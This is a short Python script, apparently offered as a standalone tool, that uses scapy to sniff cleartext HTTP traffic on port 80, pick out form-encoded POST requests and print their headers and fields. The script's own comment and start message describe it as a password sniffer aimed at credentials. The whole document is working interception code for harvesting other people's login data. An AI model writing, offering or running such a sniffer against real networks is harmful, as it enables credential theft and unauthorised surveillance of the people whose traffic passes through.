
# Sniffs HTTP POST requests and extracts form fields (e.g. credentials)

from scapy.all import sniff, Raw
import re

def http_credentials(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')
        # basic check for HTTP POST
        if payload.startswith("POST") and "application/x-www-form-urlencoded" in payload:
            print("\n=== HTTP POST ===")
            headers, body = payload.split("\r\n\r\n", 1)
            print("Headers:\n", headers)
            print("Body:\n", body)
            # extract key=value pairs
            for pair in body.split("&"):
                k, _, v = pair.partition("=")
                print(f"  {k}: {v}")

if __name__ == "__main__":
    print("Starting password sniffer (CTRL+C to stop)...")
    # sniff on port 80 or adjust iface as needed
    sniff(filter="tcp port 80", prn=http_credentials, store=False)
